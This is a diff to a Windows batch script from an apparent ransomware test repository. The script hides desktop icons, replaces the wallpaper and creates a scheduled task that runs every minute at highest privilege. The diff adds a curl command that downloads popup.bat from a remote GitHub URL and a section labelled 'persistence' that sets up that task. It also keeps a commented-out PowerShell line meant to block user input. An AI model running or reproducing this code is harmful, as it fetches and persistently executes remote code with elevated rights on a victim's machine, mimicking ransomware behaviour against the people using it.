@@ -1,7 +1,8 @@
 @echo off
 
-set TaskName=PopupTask
-set ScriptPath=C:\temp\popup.bat
+set "TaskName=PopupTask"
+set "url=https://raw.githubusercontent.com/git-TGMB/RansomwareTest/main/popup.bat"
+set "ScriptPath=C:\temp\popup.bat"
 
 :: Hide desktop icons
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideIcons /t REG_DWORD /d 1 /f
@@ -16,7 +17,11 @@ reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
 
 :: Block user input
-powershell -WindowStyle Hidden -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('{F24}')"
+:: powershell -WindowStyle Hidden -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('{F24}')"
 
-:: schtask for popup
+:: persistence
+curl -L -o "%ScriptPath%" "%url%"
+sleep 3
+
+:: schtask for popup.bat
 schtasks /Create /TN "%TaskName%" /TR "%ScriptPath%" /SC MINUTE /MO 1 /RL HIGHEST /F
